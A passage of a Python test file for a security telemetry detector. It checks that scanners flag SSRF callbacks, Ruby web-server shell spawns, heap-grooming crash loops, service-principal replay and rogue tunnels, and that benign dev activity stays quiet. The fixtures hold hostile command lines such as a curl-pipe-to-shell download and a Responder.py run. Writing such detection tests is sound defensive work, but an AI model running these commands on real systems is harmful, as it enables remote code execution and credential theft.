        ("claude", "/usr/bin/python3", "python3 autoresponder/responder.py --check"),
        ("claude", "/usr/bin/python3", "python3 mycoercer/coercer.py --help"),
        ("claude", "/usr/bin/python3", "python3 tests/test_sqlmap_parser.py"),
        ("claude", "/usr/bin/bash", "bash -c cd /work/responder && pytest -q"),
        ("claude", "/usr/bin/bash", "bash -c cloudflared --version"),
        ("claude", "/usr/bin/bash", "bash -c devtunnel --help"),
        ("claude", "/usr/local/bin/cloudflared", "cloudflared --version"),
        ("agent-zero", "/usr/local/bin/devtunnel", "devtunnel --help"),
    ]
    for idx, (parent, proc, cmd) in enumerate(fp_cases):
        p = tmp_path / f"wt_fp_{idx}.jsonl"
        p.write_text(
            json.dumps(
                {
                    "timestamp": "2026-11-23T08:05:00.000Z",
                    "source_host": f"dev-fp-{idx}",
                    "actor": "dev",
                    "event_type": "process",
                    "surface": "endpoint",
                    "parent_process": f"/usr/local/bin/{parent}",
                    "process": proc,
                    "command_line": cmd,
                    "status_code": 0,
                }
            )
            + "\n",
            encoding="utf-8",
        )
        assert scan_telemetry_file(p) == [], f"Unexpected FP on benign dev command: {cmd}"

    # 3. Proactive RedAmon / Xalgorix / Pentest Swarm AI high-confidence UA & canary markers
    fw_log = tmp_path / "new_frameworks.jsonl"
    fw_log.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {"timestamp": "2026-11-23T08:10:00.000Z", "source_host": "198.51.100.31", "actor": "198.51.100.31", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/v1/models", "user_agent": "RedAmon-AISurfaceRecon/1.0", "status_code": 200},
                {"timestamp": "2026-11-23T08:11:00.000Z", "source_host": "198.51.100.32", "actor": "198.51.100.32", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/search?q=rEdAm0n1337XsS", "status_code": 200},
                {"timestamp": "2026-11-23T08:12:00.000Z", "source_host": "198.51.100.33", "actor": "198.51.100.33", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/xalgorix-xxe-check", "status_code": 404},
                {"timestamp": "2026-11-23T08:13:00.000Z", "source_host": "198.51.100.34", "actor": "198.51.100.34", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/check?host=evil.pentestswarm.invalid", "status_code": 400},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    fw_cands = scan_telemetry_file(fw_log)
    assert len(fw_cands) == 4
    by_host = {c.source_host: c.reasons for c in fw_cands}
    assert "agentic_user_agent_burst" in by_host["198.51.100.31"]
    assert "unit42_agentic_canary_probe" in by_host["198.51.100.32"]
    assert "unit42_agentic_canary_probe" in by_host["198.51.100.33"]
    assert "unit42_agentic_canary_probe" in by_host["198.51.100.34"]


def test_zeek_dns_log_oob_conversion_and_kvm_falsification_cli_portability(tmp_path: Path) -> None:
    """Verify Zeek dns.log conversion triggers dns_oob_callback_after_probe & run_falsification.py CLI is portable."""
    exporter = _load_exporter()

    # 1. Zeek http.log (probe to 172.30.0.20) + dns.log (target 172.30.0.20 emits high-entropy OOB DNS callback)
    raw_dir = tmp_path / "zeek_dns_oob"
    raw_dir.mkdir()
    (raw_dir / "http.log").write_text(
        json.dumps(
            {
                "ts": 1795450000.0,
                "uid": "Chttp1",
                "id.orig_h": "172.30.0.10",
                "id.orig_p": 41000,
                "id.resp_h": "172.30.0.20",
                "id.resp_p": 80,
                "method": "GET",
                "host": "172.30.0.20",
                "uri": "/api/v1/ssrf-sim",
                "user_agent": "python-httpx/0.28.1",
                "status_code": 200,
            }
        )
        + "\n",
        encoding="utf-8",
    )
    (raw_dir / "dns.log").write_text(
        json.dumps(
            {
                "ts": 1795450002.0,
                "uid": "Cdns1",
                "id.orig_h": "172.30.0.20",
                "id.orig_p": 53000,
                "id.resp_h": "172.30.0.10",
                "id.resp_p": 53,
                "query": "a9f8e7d6c5b4a3928170.oob-exfil.example",
                "qtype_name": "A",
            }
        )
        + "\n",
        encoding="utf-8",
    )
    (raw_dir / "conn.log").write_text(
        json.dumps(
            {
                "ts": 1795450002.0,
                "uid": "Cdns1",
                "id.orig_h": "172.30.0.20",
                "id.orig_p": 53000,
                "id.resp_h": "172.30.0.10",
                "id.resp_p": 53,
                "orig_bytes": 60,
                "resp_bytes": 76,
                "conn_state": "SF",
            }
        )
        + "\n",
        encoding="utf-8",
    )
    out_j = tmp_path / "zeek_dns_oob.jsonl"
    cnt = exporter.convert_directory(raw_dir, out_j)
    assert cnt == 2, "dns.log UID must be deduplicated from conn.log"
    cands = scan_telemetry_file(out_j)
    assert any("dns_oob_callback_after_probe" in c.reasons for c in cands)

    # 2. Portable CLI check for lab/kvm/run_falsification.py (no hardcoded personal paths, valid --help)
    fals_script = LAB_DIR / "run_falsification.py"
    assert fals_script.is_file()
    src_text = fals_script.read_text(encoding="utf-8")
    assert "/home/" not in src_text, "run_falsification.py must not hardcode personal /home/ paths"
    res = subprocess.run([sys.executable, str(fals_script), "--help"], capture_output=True, text=True, check=True)
    assert "--model" in res.stdout and "--phases" in res.stdout


def test_suricata_eve_meta_dedup_zeek_mdns_filter_and_host_port_oob_join(tmp_path: Path) -> None:
    """Real-wire regressions: Suricata EVE flow/fileinfo/stats/DNS-answer dedup, Zeek mDNS filter, and Host:port OOB DNS join."""
    from artex_defense.parsers import parse_auto

    exporter = _load_exporter()

    # 1. Zeek mDNS UDP/5353 & IPv6 multicast chatter must be dropped while Host:8080 correlates with dns_oob_callback_after_probe
    raw_dir = tmp_path / "zeek_mdns"
    raw_dir.mkdir()
    (raw_dir / "http.log").write_text(
        json.dumps(
            {
                "ts": 1795460000.0,
                "uid": "Ch1",
                "id.orig_h": "10.1.0.50",
                "id.orig_p": 42000,
                "id.resp_h": "10.1.0.20",
                "id.resp_p": 8080,
                "method": "GET",
                "host": "10.1.0.20:8080",
                "uri": "/api/v1/ssrf",
                "user_agent": "python-httpx/0.28.1",
                "status_code": 200,
            }
        )
        + "\n",
        encoding="utf-8",
    )
    (raw_dir / "dns.log").write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {"ts": 1795460000.1, "uid": "Cmdns1", "id.orig_h": "fe80::1", "id.orig_p": 5353, "id.resp_h": "ff02::fb", "id.resp_p": 5353, "query": "workstation.local", "qtype_name": "*"},
                {"ts": 1795460000.2, "uid": "Cmdns2", "id.orig_h": "10.1.0.1", "id.orig_p": 5353, "id.resp_h": "224.0.0.251", "id.resp_p": 5353, "query": "workstation.local", "qtype_name": "A"},
                {"ts": 1795460001.5, "uid": "Coob1", "id.orig_h": "10.1.0.20", "id.orig_p": 51000, "id.resp_h": "10.1.0.50", "id.resp_p": 53, "query": "f1e2d3c4b5a69788796a.oob.example", "qtype_name": "A"},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    (raw_dir / "conn.log").write_text(
        json.dumps({"ts": 1795460000.3, "uid": "Cmc1", "id.orig_h": "fe80::1", "id.orig_p": 0, "id.resp_h": "ff02::16", "id.resp_p": 0, "orig_bytes": 76, "resp_bytes": 0, "conn_state": "OTH"})
        + "\n",
        encoding="utf-8",
    )
    out_j = tmp_path / "zeek_mdns.jsonl"
    cnt = exporter.convert_directory(raw_dir, out_j)
    assert cnt == 2, f"Expected mDNS/multicast dropped leaving 2 events, got {cnt}"
    cands = scan_telemetry_file(out_j)
    assert any("dns_oob_callback_after_probe" in c.reasons for c in cands)

    # 2. Direct Host:port JSONL (without exporter normalization) MUST still correlate in detectors.py
    direct_oob = tmp_path / "direct_host_port_oob.jsonl"
    direct_oob.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {"timestamp": "2026-11-23T20:00:00Z", "source_host": "10.1.0.50", "event_type": "http", "surface": "web_portal", "dest_host": "10.1.0.20:8443", "dest_port": 8443, "http_method": "GET", "http_path": "/ssrf", "status_code": 200},
                {"timestamp": "2026-11-23T20:00:02Z", "source_host": "10.1.0.20", "event_type": "dns", "surface": "network", "dest_host": "1a2b3c4d5e6f7a8b9c0d.oob.example", "dest_port": 53},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    direct_cands = scan_telemetry_file(direct_oob)
    assert any("dns_oob_callback_after_probe" in c.reasons for c in direct_cands)

    # 3. Suricata 7 EVE JSON: drop stats/fileinfo/DNS-answer/duplicate-flow & merge flow byte counters onto tls
    eve_file = tmp_path / "suri_meta.json"
    eve_rows = [
        {"timestamp": "2026-11-23T20:00:00.000000+0000", "flow_id": 101, "event_type": "http", "src_ip": "10.1.0.10", "dest_ip": "10.1.0.20", "dest_port": 80, "http": {"hostname": "10.1.0.20", "url": "/dashboard", "http_method": "GET", "http_user_agent": "Mozilla/5.0 Chrome/131.0.0.0", "status": 200}},
        {"timestamp": "2026-11-23T20:00:00.001000+0000", "flow_id": 101, "event_type": "fileinfo", "src_ip": "10.1.0.20", "dest_ip": "10.1.0.10", "dest_port": 50000, "http": {"hostname": "10.1.0.20", "url": "/dashboard", "status": 200}, "fileinfo": {"filename": "/dashboard", "size": 54}},
        {"timestamp": "2026-11-23T20:00:05.000000+0000", "flow_id": 102, "event_type": "tls", "src_ip": "10.1.0.10", "dest_ip": "10.1.0.20", "dest_port": 443, "tls": {"sni": "app.corp.local", "ja4": "t13d311100_e8f1e7e78f70_d41ae481755e"}},
        {"timestamp": "2026-11-23T20:00:08.000000+0000", "flow_id": 103, "event_type": "dns", "src_ip": "10.1.0.10", "dest_ip": "10.1.0.20", "dest_port": 53, "dns": {"type": "query", "rrname": "app.corp.local", "rrtype": "A"}},
        {"timestamp": "2026-11-23T20:00:08.001000+0000", "flow_id": 103, "event_type": "dns", "src_ip": "10.1.0.10", "dest_ip": "10.1.0.20", "dest_port": 53, "dns": {"type": "answer", "rrname": "app.corp.local", "rrtype": "A"}},
        {"timestamp": "2026-11-23T19:59:59.000000+0000", "flow_id": 101, "event_type": "flow", "src_ip": "10.1.0.10", "dest_ip": "10.1.0.20", "dest_port": 80, "app_proto": "http", "flow": {"bytes_toserver": 500, "bytes_toclient": 400, "start": "2026-11-23T20:00:00.000000+0000"}},
        {"timestamp": "2026-11-23T19:59:59.000000+0000", "flow_id": 102, "event_type": "flow", "src_ip": "10.1.0.10", "dest_ip": "10.1.0.20", "dest_port": 443, "app_proto": "tls", "flow": {"bytes_toserver": 4200, "bytes_toclient": 1100, "start": "2026-11-23T20:00:05.000000+0000"}},
        {"timestamp": "2026-11-23T19:59:59.000000+0000", "flow_id": 104, "event_type": "flow", "src_ip": "fe80::1", "dest_ip": "ff02::fb", "dest_port": 5353, "app_proto": "failed", "flow": {"bytes_toserver": 200, "bytes_toclient": 0}},
        {"timestamp": "2026-11-23T20:00:10.000000+0000", "event_type": "stats", "stats": {"uptime": 10}},
    ]
    eve_file.write_text("\n".join(json.dumps(r) for r in eve_rows) + "\n", encoding="utf-8")
    parsed = parse_auto(eve_file)
    assert len(parsed) == 3, f"Expected 3 deduplicated EVE events (http, tls, dns query), got {len(parsed)}"
    tls_ev = [e for e in parsed if e["event_type"] == "tls"][0]
    assert tls_ev["bytes_out"] == 4200 and tls_ev["bytes_in"] == 1100, "flow byte counters must merge onto tls flow_id"

    # 4. JSON-array (`[...]`) and single-object (`{...}`) Suricata EVE files must match NDJSON identically
    eve_array = tmp_path / "suri_meta_array.json"
    eve_array.write_text(json.dumps(eve_rows), encoding="utf-8")
    parsed_arr = parse_auto(eve_array)
    assert parsed_arr == parsed, "JSON-array EVE parsing must match NDJSON dedup & flow_id byte correlation"

    eve_single_stats = tmp_path / "suri_single_stats.json"
    eve_single_stats.write_text(json.dumps({"timestamp": "2026-11-23T20:00:10.000000+0000", "event_type": "stats", "stats": {"uptime": 10}}), encoding="utf-8")
    assert parse_auto(eve_single_stats) == [], "Standalone Suricata stats dict must be filtered"

    # 5. Bracketed IPv6 without :port (`[2001:db8::1]`) must also correlate in detectors.py
    ipv6_oob = tmp_path / "ipv6_bracket_oob.jsonl"
    ipv6_oob.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {"timestamp": "2026-11-23T20:00:00Z", "source_host": "2001:db8::50", "event_type": "http", "surface": "web_portal", "dest_host": "[2001:db8::1]", "dest_port": 80, "http_method": "GET", "http_path": "/ssrf", "status_code": 200},
                {"timestamp": "2026-11-23T20:00:02Z", "source_host": "2001:db8::1", "event_type": "dns", "surface": "network", "dest_host": "1a2b3c4d5e6f7a8b9c0d.oob.example", "dest_port": 53},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    assert any("dns_oob_callback_after_probe" in c.reasons for c in scan_telemetry_file(ipv6_oob))


def test_ruby2shell_parent_shell_spawn_and_5xx_heap_grooming_zero_fp(tmp_path: Path) -> None:
    """Ruby2Shell (CVE-2026-132825): verify puma/ruby shell-spawn & Zero-IOC 5xx heap-grooming TP with 0 FP on benign builds/outages/German text."""
    # 1. TP: Puma dedicated Ruby app server spawning /bin/sh -> web_parent_shell_spawn (alert)
    p_puma = tmp_path / "puma_rce.jsonl"
    p_puma.write_text(
        json.dumps(
            {
                "timestamp": "2026-11-23T21:00:00Z",
                "source_host": "gitlab-prod-01",
                "actor": "git",
                "event_type": "process",
                "surface": "endpoint",
                "parent_process": "/opt/gitlab/embedded/bin/puma",
                "process": "/bin/sh",
                "command_line": "sh -c id",
            }
        )
        + "\n",
        encoding="utf-8",
    )
    c_puma = scan_telemetry_file(p_puma)
    assert c_puma and "web_parent_shell_spawn" in c_puma[0].reasons and c_puma[0].alert_tier == "alert"

    # 2. TP: ruby runtime spawning suspicious curl pipe shell -> web_parent_shell_spawn (alert)
    p_ruby_bad = tmp_path / "ruby_rce.jsonl"
    p_ruby_bad.write_text(
        json.dumps(
            {
                "timestamp": "2026-11-23T21:00:05Z",
                "source_host": "rails-web-02",
                "actor": "deploy",
                "event_type": "process",
                "surface": "endpoint",
                "parent_process": "/usr/bin/ruby",
                "process": "/bin/bash",
                "command_line": "bash -c 'curl -s http://198.51.100.20/s | sh'",
            }
        )
        + "\n",
        encoding="utf-8",
    )
    c_ruby_bad = scan_telemetry_file(p_ruby_bad)
    assert c_ruby_bad and "web_parent_shell_spawn" in c_ruby_bad[0].reasons

    # 3. TN (0 FP): Benign ruby build/test invoking shell (bundle exec rake test) -> 0 candidates
    p_ruby_ok = tmp_path / "ruby_benign.jsonl"
    p_ruby_ok.write_text(
        json.dumps(
            {
                "timestamp": "2026-11-23T21:00:10Z",
                "source_host": "ci-runner-01",
                "actor": "ci",
                "event_type": "process",
                "surface": "endpoint",
                "parent_process": "/usr/bin/ruby",
                "process": "/bin/sh",
                "command_line": "sh -c 'git rev-parse --short HEAD'",
            }
        )
        + "\n",
        encoding="utf-8",
    )
    assert scan_telemetry_file(p_ruby_ok) == []

    # 4. TP (Zero-IOC): Rapid 502 worker crash-loop across 3 distinct POST sizes -> 200 recovery (zero charset/0xDF strings!)
    p_groom = tmp_path / "heap_groom_5xx.jsonl"
    groom_rows = [
        {"timestamp": "2026-11-23T21:01:00.0Z", "source_host": "198.51.100.88", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 64, "status_code": 502},
        {"timestamp": "2026-11-23T21:01:00.4Z", "source_host": "198.51.100.88", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 128, "status_code": 502},
        {"timestamp": "2026-11-23T21:01:00.8Z", "source_host": "198.51.100.88", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 256, "status_code": 502},
        {"timestamp": "2026-11-23T21:01:01.2Z", "source_host": "198.51.100.88", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 384, "status_code": 200},
    ]
    p_groom.write_text("\n".join(json.dumps(r) for r in groom_rows) + "\n", encoding="utf-8")
    c_groom = scan_telemetry_file(p_groom)
    assert c_groom and "web_memory_corruption_crash_loop" in c_groom[0].reasons and c_groom[0].alert_tier == "alert"

    # 5. TN (0 FP): Slow human Rails deployment 502 outage across distinct sizes -> 200 recovery (>3s pacing) -> 0 web_memory_corruption_crash_loop
    p_outage = tmp_path / "benign_deploy_outage.jsonl"
    outage_rows = [
        {"timestamp": "2026-11-23T21:02:00Z", "source_host": "10.20.0.15", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 64, "status_code": 502},
        {"timestamp": "2026-11-23T21:02:06Z", "source_host": "10.20.0.15", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 128, "status_code": 502},
        {"timestamp": "2026-11-23T21:02:14Z", "source_host": "10.20.0.15", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 256, "status_code": 502},
        {"timestamp": "2026-11-23T21:02:23Z", "source_host": "10.20.0.15", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 384, "status_code": 200},
    ]
    p_outage.write_text("\n".join(json.dumps(r) for r in outage_rows) + "\n", encoding="utf-8")
    assert scan_telemetry_file(p_outage) == []

    # 6. TN (0 FP): Legitimate German ISO-8859-1 form POST containing single 'ß' ("Straße") -> 0 candidates
    p_german = tmp_path / "benign_german_iso8859.jsonl"
    p_german.write_text(
        json.dumps(
            {
                "timestamp": "2026-11-23T21:03:00Z",
                "source_host": "10.20.0.22",
                "event_type": "http",
                "surface": "web_portal",
                "dest_host": "rails.corp.local",
                "http_method": "POST",
                "http_path": "/api/v1/rails-form",
                "status_code": 200,
                "raw_json": {"content_type": "application/x-www-form-urlencoded; charset=iso-8859-1", "body": "street=Hauptstraße+12"},
            }
        )
        + "\n",
        encoding="utf-8",
    )
    assert scan_telemetry_file(p_german) == []

    # 7. TN (0 FP): Path-substring FP guard — /home/passenger/app/deploy.sh, /usr/bin/passenger-config, /srv/puma-docs/build.sh
    p_substr = tmp_path / "benign_parent_substrings.jsonl"
    p_substr.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {"timestamp": "2026-11-23T21:04:00Z", "source_host": "dev-01", "actor": "dev", "event_type": "process", "surface": "endpoint", "parent_process": "/home/passenger/app/deploy.sh", "process": "/bin/sh", "command_line": "sh -c 'git pull --ff-only'"},
                {"timestamp": "2026-11-23T21:04:05Z", "source_host": "dev-01", "actor": "dev", "event_type": "process", "surface": "endpoint", "parent_process": "/usr/bin/passenger-config", "process": "/bin/sh", "command_line": "sh -c 'which ruby'"},
                {"timestamp": "2026-11-23T21:04:10Z", "source_host": "dev-01", "actor": "dev", "event_type": "process", "surface": "endpoint", "parent_process": "/srv/puma-docs/build.sh", "process": "/bin/bash", "command_line": "bash -c 'mkdocs build'"},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    assert scan_telemetry_file(p_substr) == []

    # 8. TN (0 FP): Security research URLs & CLI greps mentioning CVE-2026-132825 / ruby2shell must NOT alert!
    p_research = tmp_path / "benign_cve_research.jsonl"
    p_research.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {"timestamp": "2026-11-23T21:05:00Z", "source_host": "10.30.0.5", "event_type": "http", "surface": "web_portal", "dest_host": "nvd.example", "http_method": "GET", "http_path": "/vuln/detail/CVE-2026-132825", "status_code": 200},
                {"timestamp": "2026-11-23T21:05:04Z", "source_host": "10.30.0.5", "event_type": "http", "surface": "web_portal", "dest_host": "blog.example", "http_method": "GET", "http_path": "/posts/ruby2shell-analysis", "status_code": 200},
                {"timestamp": "2026-11-23T21:05:10Z", "source_host": "sec-01", "actor": "analyst", "event_type": "process", "surface": "endpoint", "process": "/usr/bin/rg", "command_line": "rg CVE-2026-132825 docs/"},
                {"timestamp": "2026-11-23T21:05:15Z", "source_host": "sec-01", "actor": "analyst", "event_type": "process", "surface": "endpoint", "process": "/usr/bin/git", "command_line": "git log --grep=ruby2shell"},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    assert scan_telemetry_file(p_research) == []

    # 9. TP: JSON-escaped \u00df\u00df\u00df\u00df (default Python json.dumps ensure_ascii=True) under ISO-8859-1 must fire!
    p_u00df = tmp_path / "r2s_u00df_escaped.jsonl"
    p_u00df.write_text(
        "\n".join(
            json.dumps(r, ensure_ascii=True)
            for r in [
                {"timestamp": "2026-11-23T21:06:00Z", "source_host": "198.51.100.90", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "status_code": 502, "raw_json": {"content_type": "application/x-www-form-urlencoded; charset=iso-8859-1", "body": "q=\u00df\u00df\u00df\u00df\u00df\u00df"}},
                {"timestamp": "2026-11-23T21:06:01Z", "source_host": "198.51.100.90", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "status_code": 502, "raw_json": {"content_type": "application/x-www-form-urlencoded; charset=iso-8859-1", "body": "q=\u00df\u00df\u00df\u00df\u00df\u00dfAA"}},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    c_u00df = scan_telemetry_file(p_u00df)
    assert c_u00df and "web_memory_corruption_crash_loop" in c_u00df[0].reasons

    # 10. TN (0 FP): Busy API client hitting non-monotonic random-size POSTs during a 502/503 deploy blip -> 0 web_memory_corruption_crash_loop
    p_blip = tmp_path / "busy_api_blip.jsonl"
    p_blip.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {"timestamp": "2026-11-23T21:07:00.0Z", "source_host": "10.20.0.50", "event_type": "http", "surface": "web_portal", "dest_host": "api.corp.local", "http_method": "POST", "http_path": "/api/orders", "bytes_out": 240, "status_code": 502},
                {"timestamp": "2026-11-23T21:07:00.5Z", "source_host": "10.20.0.50", "event_type": "http", "surface": "web_portal", "dest_host": "api.corp.local", "http_method": "POST", "http_path": "/api/orders", "bytes_out": 190, "status_code": 502},
                {"timestamp": "2026-11-23T21:07:01.0Z", "source_host": "10.20.0.50", "event_type": "http", "surface": "web_portal", "dest_host": "api.corp.local", "http_method": "POST", "http_path": "/api/orders", "bytes_out": 310, "status_code": 503},
                {"timestamp": "2026-11-23T21:07:01.5Z", "source_host": "10.20.0.50", "event_type": "http", "surface": "web_portal", "dest_host": "api.corp.local", "http_method": "POST", "http_path": "/api/orders", "bytes_out": 215, "status_code": 200},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    assert all("web_memory_corruption_crash_loop" not in c.reasons for c in scan_telemetry_file(p_blip))

    # 11. TP: Slow-prefix evasion resistance — 2 slow GETs (10s apart) before a rapid monotonic 502 heap-grooming sweep MUST still fire!
    p_slow_pre = tmp_path / "slow_prefix_heap_groom.jsonl"
    p_slow_pre.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {"timestamp": "2026-11-23T21:08:00.0Z", "source_host": "198.51.100.91", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "GET", "http_path": "/", "status_code": 200},
                {"timestamp": "2026-11-23T21:08:10.0Z", "source_host": "198.51.100.91", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "GET", "http_path": "/about", "status_code": 200},
                {"timestamp": "2026-11-23T21:08:20.0Z", "source_host": "198.51.100.91", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 64, "status_code": 502},
                {"timestamp": "2026-11-23T21:08:20.1Z", "source_host": "198.51.100.91", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 128, "status_code": 502},
                {"timestamp": "2026-11-23T21:08:20.2Z", "source_host": "198.51.100.91", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 256, "status_code": 502},
                {"timestamp": "2026-11-23T21:08:20.3Z", "source_host": "198.51.100.91", "event_type": "http", "surface": "web_portal", "dest_host": "rails.corp.local", "http_method": "POST", "http_path": "/api/v1/rails-form", "bytes_out": 384, "status_code": 200},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    c_slow_pre = scan_telemetry_file(p_slow_pre)
    assert c_slow_pre and "web_memory_corruption_crash_loop" in c_slow_pre[0].reasons


def test_storm0940_preauth_sp_replay_and_server_ephemeral_tunnel_and_responder_zero_fp(tmp_path: Path) -> None:
    """Adversarial mutation matrix regressions: Storm-0940 zero-401 SP replay, server cloudflared --url, and Responder/Responder.py."""
    # 1. TP: Storm-0940 / ConnectWise Cloud Backup zero-401 SP replay across rotating external IPs + 4 M365 resources
    #    preceded earlier in the day by 10 benign single-IP/single-resource events (verifies sliding-window non-masking!).
    p_sp = tmp_path / "storm0940_sp.jsonl"
    sp_rows = [
        {"createdDateTime": f"2026-11-23T02:00:{i*3:02d}Z", "ipAddress": "198.51.100.10", "servicePrincipalName": "Backup-Connector-SP", "isInteractive": False, "resourceDisplayName": "Office 365 Exchange Online", "status": {"errorCode": 0}}
        for i in range(10)
    ] + [
        {"createdDateTime": f"2026-11-23T05:0{i}:00Z", "ipAddress": f"198.51.100.{50+i}", "servicePrincipalName": "Backup-Connector-SP", "isInteractive": False, "resourceDisplayName": res, "status": {"errorCode": 0}}
        for i, res in enumerate(["Microsoft Graph", "Office 365 Exchange Online", "Office 365 SharePoint Online", "Azure Key Vault"])
    ]
    p_sp.write_text("\n".join(json.dumps(r) for r in sp_rows) + "\n", encoding="utf-8")
    c_sp = scan_telemetry_file(p_sp)
    sp_reasons = {r for c in c_sp for r in c.reasons}
    assert {"idp_sp_multi_ip_replay", "idp_sp_multi_resource_fanout"}.issubset(sp_reasons)

    # 2. TN (0 FP): Single-IP static SaaS backup touching 4 M365 resources, single-/16 cloud backup cluster touching 3 M365 resources, & RFC1918 SP
    p_sp_ok = tmp_path / "benign_saas_sp.jsonl"
    sp_ok_rows = [
        {"createdDateTime": f"2026-11-23T06:00:0{i}Z", "ipAddress": "203.0.113.50", "servicePrincipalName": "Veeam-O365-Backup-SP", "isInteractive": False, "resourceDisplayName": res, "status": {"errorCode": 0}}
        for i, res in enumerate(["Microsoft Graph", "Office 365 Exchange Online", "Office 365 SharePoint Online", "Microsoft Teams Services"])
    ] + [
        {"createdDateTime": f"2026-11-23T06:00:1{i}Z", "ipAddress": f"20.80.{i}.10", "servicePrincipalName": "Azure-Same16-Backup-SP", "isInteractive": False, "resourceDisplayName": res, "status": {"errorCode": 0}}
        for i, res in enumerate(["Microsoft Graph", "Office 365 Exchange Online", "Office 365 SharePoint Online"])
    ] + [
        {"createdDateTime": f"2026-11-23T06:01:0{i}Z", "ipAddress": f"10.50.0.{10+i}", "servicePrincipalName": "Internal-Sync-SP", "isInteractive": False, "resourceDisplayName": res, "status": {"errorCode": 0}}
        for i, res in enumerate(["Microsoft Graph", "Office 365 Exchange Online", "Office 365 SharePoint Online", "Azure Key Vault"])
    ]
    p_sp_ok.write_text("\n".join(json.dumps(r) for r in sp_ok_rows) + "\n", encoding="utf-8")
    assert scan_telemetry_file(p_sp_ok) == []

    # 3. TP: Server-side ephemeral cloudflared --url tunnel, argv[0]-rewritten /tmp cloudflared, & standalone Responder/Responder.py
    p_srv = tmp_path / "server_tunnel_and_responder.jsonl"
    p_srv.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {"timestamp": "2026-11-23T07:00:00Z", "source_host": "app-prod-07", "actor": "uid:33", "event_type": "process", "surface": "endpoint", "parent_process": "/bin/sh", "process": "/tmp/.cache/cloudflared", "command_line": "cloudflared tunnel run"},
                {"timestamp": "2026-11-23T07:00:02Z", "source_host": "app-prod-07", "actor": "uid:33", "event_type": "process", "surface": "endpoint", "parent_process": "/bin/bash", "process": "/usr/bin/python3", "command_line": "python3 /opt/tools/Responder/Responder.py -I eth0"},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    c_srv = scan_telemetry_file(p_srv)
    assert c_srv and {"socks_chisel_pivot_tunnel_mesh", "ad_ntlm_relay_or_ldap_kerb_enum"}.issubset(set(c_srv[0].reasons))

    # 4. TN (0 FP): Dev workstation running cloudflared --url + prod server running named cloudflared tunnel run + autoresponder/responder.py
    p_srv_ok = tmp_path / "benign_tunnels_and_autoresponder.jsonl"
    p_srv_ok.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {"timestamp": "2026-11-23T07:05:00Z", "source_host": "laptop-dev-04", "actor": "alice", "event_type": "process", "surface": "endpoint", "parent_process": "/bin/zsh", "process": "/usr/bin/cloudflared", "command_line": "cloudflared tunnel --url http://localhost:3000"},
                {"timestamp": "2026-11-23T07:05:05Z", "source_host": "edge-prod-01", "actor": "cloudflared", "event_type": "process", "surface": "endpoint", "parent_process": "/sbin/init", "process": "/usr/bin/cloudflared", "command_line": "/usr/bin/cloudflared tunnel run prod-ingress"},
                {"timestamp": "2026-11-23T07:05:10Z", "source_host": "app-prod-07", "actor": "deploy", "event_type": "process", "surface": "endpoint", "parent_process": "/bin/bash", "process": "/usr/bin/python3", "command_line": "python3 /srv/mail/autoresponder/responder.py --check"},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    assert scan_telemetry_file(p_srv_ok) == []


def test_gcp_cloud_audit_tri_cloud_and_bitrise_artex_ttps(tmp_path: Path) -> None:
    """Native GCP Cloud Audit parser + Bitrise SEV-1 ARTEX TTPs (multi-SA single-IP, PERMISSION_DENIED->SecretManager, task-iteration probes) with 0 FP baselines."""

    def _gcp_entry(
        ts: str,
        ip: str,
        principal: str,
        service: str,
        method: str,
